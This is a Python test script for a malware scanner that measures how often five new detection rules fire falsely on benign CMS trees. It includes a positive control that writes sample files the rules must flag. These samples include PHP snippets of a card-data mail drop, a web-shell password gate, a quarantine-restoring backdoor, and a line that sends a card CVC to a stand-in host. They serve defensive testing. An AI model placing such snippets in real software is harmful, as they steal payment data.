#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Re-measure the round-11 rules' false positives with the built scanner.

Why this exists as well as `corpus/fp-population.py`
----------------------------------------------------
`fp-population.py` measures a *candidate* - a Python predicate - against a tree. That
is the right tool before a rule exists, and its numbers are what these rules were built
to. It cannot answer the question that matters once the rule is written: what does the
scanner, walking real directories with its own extension filter, size cap and context
filters, actually report? Those are two different predicates over two different file
sets, and quoting the first as if it were the second is how a rule ships on a number
nobody measured.

So this runs `lyxbosa scan` over the same trees and counts the new rules' findings.
Every one of them is a false positive by construction: the trees are stock CMS cores,
pinned plugins and themes, and a sanitised live site.

It prints `totalFilesScanned` and the skip tally out of each report rather than the
count anybody expected, because **a scan that read nothing also reports zero false
positives** - and the two are indistinguishable from the headline.

The control
-----------
`--inject` is that assertion made explicit. It writes one file per rule that the rule
must flag, into a directory laid out the way the samples were, and runs THE SAME scan
invocation over it. A rule that cannot be provoked through the whole pipeline - walker,
extension filter, analyzer, context filter, report - cannot be trusted to report zero
over a real tree. This catches more than a broken analyzer: if the walker stopped
admitting `.png`, OBF041's zero would be vacuous and nothing else here would say so.

AGENTS.md: a check that has never been observed to fail is not yet a check.

Usage
-----
    LYXBOSA_BIN=build/lyxbosa tests/rule-fp-measure.py --inject
    LYXBOSA_BIN=build/lyxbosa tests/rule-fp-measure.py trail-data/CMS trail-data/Sites
"""

from __future__ import annotations

import argparse
import collections
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

# Not `build-release`. corpus/verify.py defaults there, and a second session measuring
# detection with it must not have the binary rebuilt underneath the run.
SCANNER = os.environ.get("LYXBOSA_BIN") or os.path.join(ROOT, "build", "lyxbosa")

RULES = ["OBF041", "WS011", "BD018", "PHI009", "CRED007"]

# One file per rule that the rule must flag. The name and extension are part of the
# control: they are the path the walker has to admit for the measurement to mean
# anything. None of these carries a real secret, address or host - the samples' own
# values stay on the machine they came from.
CONTROLS = {
    "OBF041": ("assets/images/control.png",
               b"PNG" + b"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVow" * 8),
    "WS011": ("control-mailer.php",
              b"<?php\n$password = \"s3cr3tvalue\";\n"
              b"if (!empty($password) and $_REQUEST['pass'] != $password) { exit; }\n"
              b"class PHPMailer { public function send() {} }\n"),
    "BD018": ("control-deployer.php",
              b"<?php\nif (file_exists(\"../x.php.suspected\"))\n"
              b"    rename(\"../x.php.suspected\", \"../x.php\");\n"),
    "PHI009": ("control-drop.php",
               b"<?php\n$send = \"drop@example.invalid\";\n"
               b"$message = \"CARD NUMBER : \" . $_POST['cardnum'] . \"\\n\";\n"
               b"mail($send, \"s\", $message, $headers);\n"),
    "CRED007": ("control-gateway.php",
                b"<?php\nfunction process_payment() {\n"
                b"    $card_cvc = $_POST['card-cvc'];\n"
                b"    file_get_contents('http://example.invalid/?d=' . $card_cvc);\n"
                b"}\n"),
}


def scan(tree, report_path):
    """Run one scan and return the parsed report. Never quarantines, never prompts."""
    cmd = [SCANNER, "scan", tree, "-r", "--dry-run", "--no-quarantine", "--force",
           "--no-archives", "-s", "-o", "json", "-O", report_path, "--progress", "none"]
    proc = subprocess.run(cmd, capture_output=True)
    if not os.path.exists(report_path):
        print("error: no report written for %s\n%s"
              % (tree, proc.stderr.decode()[:400]), file=sys.stderr)
        return None
    with open(report_path, encoding="utf-8") as fh:
        return json.load(fh)


def count(report, rules):
    """Findings per rule code, plus the paths, from one report."""
    hits = collections.defaultdict(list)
    for f in report.get("files") or []:
        for m in f.get("matches") or []:
            code = m.get("category")
            if code in rules:
                hits[code].append((f.get("path"), m.get("line")))
    return hits


def describe_binary():
    try:
        st = os.stat(SCANNER)
    except OSError as exc:
        print("error: %s: %s" % (SCANNER, exc), file=sys.stderr)
        return False
    print("scanner   %s" % SCANNER)
    print("          %d bytes, mtime %d" % (st.st_size, int(st.st_mtime)))
    print("rules     %s\n" % ", ".join(RULES))
    return True


def inject():
    """Positive control: every rule must be provokable through the whole scan path."""
    print("Positive control: each rule must flag a file built to be flagged, found by "
          "the same\nscan invocation the measurement uses.\n")
    if not describe_binary():
        return 2
    failures = []
    with tempfile.TemporaryDirectory(prefix="rule-fp-control.") as tmp:
        tree = os.path.join(tmp, "tree")
        for _, (rel, blob) in CONTROLS.items():
            path = os.path.join(tree, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as fh:
                fh.write(blob)
        report = scan(tree, os.path.join(tmp, "control.json"))
        if report is None:
            return 2
        hits = count(report, set(RULES))
        scanned = report.get("totalFilesScanned")
        print("  files written %d, files the scanner read %s"
              % (len(CONTROLS), scanned))
        if scanned != len(CONTROLS):
            print("  ! the walker did not read every control file - a zero from this "
                  "tool would be measuring the walker, not the rules")
            failures.append("walker")
        for code in RULES:
            ok = bool(hits.get(code))
            print("  %s  %-8s %d finding(s)" % ("PASS" if ok else "FAIL", code,
                                                len(hits.get(code, []))))
            if not ok:
                failures.append(code)
    print()
    if failures:
        print("CONTROL FAILED: %s" % ", ".join(failures))
        print("A rule that cannot be provoked here cannot be trusted to report zero "
              "over a real tree.")
        return 1
    print("All %d rules fired on their control, and the walker read every control file. "
          "A zero\nfrom this tool over a real tree is therefore a measurement, not a "
          "blind pass." % len(RULES))
    return 0


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("trees", nargs="*", help="benign trees to measure against")
    ap.add_argument("--inject", action="store_true",
                    help="run the positive control and exit")
    ap.add_argument("--reports", default=None,
                    help="directory to keep the JSON reports in (default: temporary)")
    args = ap.parse_args()

    if args.inject:
        return inject()
    if not args.trees:
        ap.error("give at least one tree to measure, or --inject")
    if not describe_binary():
        return 2

    keep = args.reports
    if keep:
        os.makedirs(keep, exist_ok=True)
    tmpdir = None if keep else tempfile.mkdtemp(prefix="rule-fp-measure.")
    outdir = keep or tmpdir

    total_scanned = 0
    total_hits = collections.Counter()
    rc = 0
    for tree in args.trees:
        report = scan(tree, os.path.join(outdir, os.path.basename(tree.rstrip("/")) + ".json"))
        if report is None:
            rc = 2
            continue
        scanned = report.get("totalFilesScanned", 0)
        skipped = report.get("filesSkipped") or {}
        total_scanned += scanned
        hits = count(report, set(RULES))
        print("%s" % tree)
        print("    filesScanned       %d   (the report's own count, not an expected one)"
              % scanned)
        print("    filesSkipped       %d   (size %d, excluded %d, unreadable %d)"
              % (skipped.get("total", 0), skipped.get("size", 0),
                 skipped.get("excluded", 0), skipped.get("unreadable", 0)))
        print("    filesWithMatches   %d   (all rules, not only the new ones)"
              % report.get("filesWithMatches", 0))
        for code in RULES:
            n = len(hits.get(code, []))
            total_hits[code] += n
            print("    %-8s           %d" % (code, n))
            for path, line in hits.get(code, [])[:5]:
                print("        hit  %s:%s" % (path, line))
        print()

    print("total over %d tree(s)" % len(args.trees))
    print("    filesScanned       %d" % total_scanned)
    for code in RULES:
        n = total_hits[code]
        print("    %-8s           %d%s" % (code, n,
              "" if n else "   (0 over %d files read)" % total_scanned))
    return rc


if __name__ == "__main__":
    sys.exit(main())
